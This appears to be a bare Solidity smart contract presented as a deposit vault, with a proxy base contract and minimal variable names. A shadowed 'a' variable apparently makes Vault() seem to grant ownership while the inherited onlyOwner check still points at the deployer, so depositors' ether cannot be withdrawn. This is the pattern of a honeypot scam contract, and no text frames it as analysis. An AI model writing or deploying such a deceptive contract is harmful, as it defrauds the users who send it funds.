pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == a) _; } address a = msg.sender;
    function transferOwner(address b) public onlyOwner { a = b; }
    function proxy(address c, bytes d) public payable {
         
        c.call.value(msg.value)(d);
    }
}

contract VaultProxy is Proxy {
    mapping (address => uint256) public b;
    address public a;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            a = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            b[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 e) public onlyOwner {
        if (e > 0 && b[msg.sender] >= e) {
            msg.sender.transfer(e);
        }
    }
}